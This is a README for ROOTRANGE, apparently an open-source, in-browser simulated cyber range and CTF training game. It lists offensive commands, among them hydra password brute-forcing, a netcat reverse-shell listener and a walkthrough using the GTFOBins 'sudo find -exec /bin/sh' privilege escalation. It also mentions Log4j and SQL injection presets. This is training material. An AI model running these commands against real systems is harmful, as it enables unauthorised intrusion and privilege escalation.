# ⚔️ ROOTRANGE // THE OPEN-SOURCE CYBER RANGE

> **An In-Browser, Zero-Subscription Cyber Range & Penetration Testing Battleground ("Hack The Box on Steroids")**  
> *Built with React 18, TypeScript, Tailwind CSS, and a client-side virtual offensive execution engine.*

```
  ____   ____   ____ _______ _____            _   _  _____ ______ 
 |  _ \ / __ \ / __ \__   __|  __ \     /\   | \ | |/ ____|  ____|
 | |_) | |  | | |  | | | |  | |__) |   /  \  |  \| | |  __| |__   
 |  _ <| |  | | |  | | | |  |  _  /   / /\ \ | . ` | | |_ |  __|  
 | |_) | |__| | |__| | | |  | | \ \  / ____ \| |\  | |__| | |____ 
 |____/ \____/ \____/  |_|  |_|  \_\/_/    \_\_| \_|\_____|______|
                     [ G H O S T // O P S ]
```

[![License: MIT](https://img.shields.io/badge/License-MIT-emerald.svg)](LICENSE)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.7-blue?logo=typescript)](https://www.typescriptlang.org/)
[![React](https://img.shields.io/badge/React-18.3-61dafb?logo=react)](https://react.dev/)
[![Tailwind CSS](https://img.shields.io/badge/Tailwind-3.4-38bdf8?logo=tailwindcss)](https://tailwindcss.com/)
[![Tests](https://img.shields.io/badge/Tests-25%20passed-brightgreen.svg)](src/tests/)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/Dotify71/ROOTRANGE/pulls)

---

## 🥊 Hack The Box vs ROOTRANGE

| Feature | Hack The Box (VIP) | ROOTRANGE |
| :--- | :--- | :--- |
| **Price** | $14 – $30 / month | **100% Free & Open Source (MIT)** |
| **Setup Required** | OpenVPN files, local VM, cloud delays | **Zero Setup (Instant In-Browser)** |
| **Offline Execution** | Requires persistent internet to cloud | **100% Client-Side In-Memory Engine** |
| **Offensive AI Co-Pilot** | None (Forum hints only) | **Built-in Socratic AI & Payload Forge** |
| **Attack Graph Visualizer** | None (Isolated IP boxes) | **BloodHound-style Multi-Subnet Pivoting** |
| **Web Proxy / Repeater** | Requires external Burp Suite setup | **Integrated In-Browser HTTP Repeater** |
| **Audio Sonification** | Silent | **Web Audio API Tactical Feedback** |

---

## 🚀 Key Modules

### 1. In-Browser "Pwnbox" Kali Terminal
Realistic offensive CLI emulator equipped with core reconnaissance and exploit tools:
* `nmap -sV -sC -p- <target_ip>`: Port scanner discovering open services and versions.
* `gobuster dir -u <url> -w common.txt`: Web endpoint fuzzing.
* `hydra -l <user> -P <wordlist> ssh://<target>`: Password brute-forcing.
* `nc -lvnp 4444`: Arbitrary TCP socket listener for catching reverse shells.
* `curl -X POST`: Raw HTTP request firing.
* Linux utilities: `cat`, `ls -la`, `cd`, `pwd`, `whoami`, `id`, `ifconfig`, and pipe handling (`cat /etc/passwd | grep root`).
* Privilege Escalation: `sudo -l` and GTFOBins exploits.

### 2. BloodHound-Style Network Attack Graph
Live interactive topology showing:
* `Perimeter Gateway (10.10.10.1)` $\to$ `E-Corp DMZ (10.10.11.45)` $\to$ `IronBank Internal LAN (10.10.11.82)` $\to$ `OmniCorp AD Forest (10.10.11.99)`.
* Nodes transition dynamically: `LOCKED` $\to$ `DISCOVERED` $\to$ `USER COMPROMISED` $\to$ `ROOTED`.

### 3. In-Browser HTTP Proxy & Repeater (Burp Suite Clone)
* Inspect raw HTTP request headers, cookies, and payloads.
* Built-in attack presets for **Log4j JNDI injection** and **SQL injection auth bypass**.
* Live response viewer with raw text and rendered HTML preview modes.

### 4. GhostOps AI Offensive Co-Pilot
* **Socratic Mentor**: Provides progressive guidance based on the current reconnaissance phase without spoiling the flags.
* **Payload Forge**: One-click copyable reverse shells (Bash, Netcat, Python PTY, Log4j strings, GTFOBins commands).
* **Autopilot Red Team**: Visual step-by-step kill-chain walkthrough.

### 5. CTF Progression & Scoreboard
* Real-time flag validation (`ROOTRANGE{...}`).
* `canvas-confetti` explosion upon flag capture.
* Dynamic rank ladder:
  * **Script Kiddie** (0 PTS)
  * **Hacker** (20 PTS)
  * **Pro Hacker** (55 PTS)
  * **Elite** (105 PTS)
  * **Omni God** (155 PTS)

---

## 🎯 Step-by-Step Walkthrough: Box 1 (E-Corp HR)

1. **Reconnaissance**:
   ```bash
   nmap -sV -sC 10.10.11.45
   # Discovers ports 22 (SSH), 80 (HTTP Apache 2.4.49), and 8080
   ```
2. **Directory Fuzzing**:
   ```bash
   gobuster dir -u http://10.10.11.45 -w common.txt
   # Reveals /admin (403), /api (200), /portal (200)
   ```
3. **Catch Reverse Shell**:
   ```bash
   nc -lvnp 4444
   # Catches incoming connection from Log4j exploit
   ```
4. **Capture User Flag**:
   ```bash
   cat /home/alex/user.txt
   # Outputs: ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}
   # Click [SUBMIT FLAG] to claim +20 PTS
   ```
5. **Privilege Escalation**:
   ```bash
   sudo -l
   # Shows: (ALL : ALL) NOPASSWD: /usr/bin/find
   sudo /usr/bin/find . -exec /bin/sh \; -quit
   # Spawns root shell!
   whoami
   # root
   cat /root/root.txt
   # Outputs: ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}
   # Machine fully rooted! (+30 PTS)
   ```

---

## 🛠️ Quickstart

```bash
# 1. Clone the repository
git clone https://github.com/Dotify71/ROOTRANGE.git
cd ROOTRANGE

# 2. Install dependencies
npm install

# 3. Run automated tests
npm test

# 4. Start local development server
npm run dev
```

Navigate to `http://localhost:5173` in your browser.

---

## 🧪 Testing

ROOTRANGE includes comprehensive unit and integration test suites:

```bash
npm test
```

All 25 test cases cover:
* In-memory virtual filesystem operations.
* CLI command execution, pipelines, and tools.
* Active Directory network graph state synchronization.
* HTTP repeater payload triggers.
* CTF flag validation and score math.
* Full end-to-end multi-stage penetration test simulation.

---

## 📜 License

Distributed under the **MIT License**. See [LICENSE](LICENSE) for details.
